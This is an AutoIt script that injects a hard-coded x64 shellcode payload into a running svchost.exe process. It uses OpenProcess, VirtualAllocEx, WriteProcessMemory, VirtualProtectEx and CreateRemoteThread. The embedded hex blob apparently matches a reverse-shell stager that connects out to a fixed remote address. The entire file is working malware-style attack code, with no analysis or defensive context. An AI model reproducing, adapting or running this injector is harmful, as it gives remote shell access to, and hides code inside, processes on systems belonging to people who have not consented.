#include <Process.au3>
#include <Memory.au3>
#include <WinAPI.au3>
#include <Array.au3>

Global $hexShellcode = "fc4883e4f0e8cc00000041514150524831d25165488b5260488b5218488b5220564d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020015b367d3c87441544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5"

_CheckProcess()
_ProcessInjection()

Func _CheckProcess()
    ConsoleWrite("[+] Checking for target process" & @CRLF & @CRLF)

    Global $targetPID = Find_Process("svchost.exe")

    If Not $targetPID = 0 Then
        Global $targetProcName = _ProcessGetName($targetPID)
        ConsoleWrite("[+] Target process is running (" & $targetProcName &")" & @CRLF & @CRLF)

    ElseIf $targetPID = 0 Then
        ConsoleWrite("[!] Target process is not running. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc

Func Find_Process($process)
    $loggedInUser = @UserName
    $processList = ProcessList()
    Dim $matchingProcesses[1]

    For $i = 1 To $processList[0][0]
        $processName = $processList[$i][0]
        $processPID = $processList[$i][1]

        If StringInStr($processName, $process) And _IsProcessOwner($processPID, $loggedInUser) Then
            ReDim $matchingProcesses[UBound($matchingProcesses) + 1]
            $matchingProcesses[UBound($matchingProcesses) - 1] = $processPID
        EndIf
    Next

    If UBound($matchingProcesses) > 1 Then
        $randomIndex = Random(1, UBound($matchingProcesses) - 1, 1)
        $randomPID = $matchingProcesses[$randomIndex]
        Return $randomPID
    Else
        Return ""
    EndIf
EndFunc

Func _ProcessInjection()
    Local $autoItshellcode = "0x" & $hexShellcode
    Local $shellcodeBuffer = DllStructCreate("byte[" & BinaryLen($autoItshellcode) & "]")
    DllStructSetData($shellcodeBuffer, 1, $autoItshellcode)
    ConsoleWrite("[+] Shellcode size: " & sizeof($shellcodeBuffer) & " bytes" & @CRLF & @CRLF)
    ConsoleWrite("[+] Injecting shellcode into PID:" & $targetPID & " (" & $targetProcName &")" & @CRLF & @CRLF)

    $hProcess = _WinAPI_OpenProcess( _
        $PROCESS_ALL_ACCESS, _
        0, _
        $targetPID, _
        True)

    $hRegion = _MemVirtualAllocEx( _
        $hProcess, _
        0, _
        sizeof($shellcodeBuffer), _
        $MEM_COMMIT + $MEM_RESERVE, _
        $PAGE_READWRITE)

    Local $written

    _WinAPI_WriteProcessMemory ( _
        $hProcess, _
        $hRegion, _
        _ptr($shellcodeBuffer), _
        sizeof($shellcodeBuffer), _
        $written)

    $protectCall = DllCall("kernel32.dll", "int", "VirtualProtectEx", _
        "hwnd", $hProcess, _
        "ptr", $hRegion, _
        "ulong_ptr", sizeof($shellcodeBuffer), _
        "uint", 0x20, _
        "uint*", 0)

    $hProtect = $protectCall[0]

    $threadCall = DllCall("Kernel32.dll", "int", "CreateRemoteThread", _
        "ptr", $hProcess, _
        "ptr", 0, _
        "int", 0, _
        "ptr", $hRegion, _
        "ptr", 0, _
        "int", 0, _
        "dword*", 0)

    $hThread = $threadCall[0]

EndFunc

Func _ptr($s, $e = "")
    If $e <> "" Then Return DllStructGetPtr($s, $e)
    Return DllStructGetPtr($s)
EndFunc

Func sizeof($s)
    Return DllStructGetSize($s)
EndFunc

Func _IsProcessOwner($processPID, $username)
    Local $aWMI = ObjGet("winmgmts:\\.\root\cimv2")
    Local $colItems = $aWMI.ExecQuery("Select * from Win32_Process where ProcessID=" & $processPID)

    For $objItem In $colItems
        If $objItem.GetOwner() = $username Then
            Return 1
        EndIf
    Next
    Return 0
EndFunc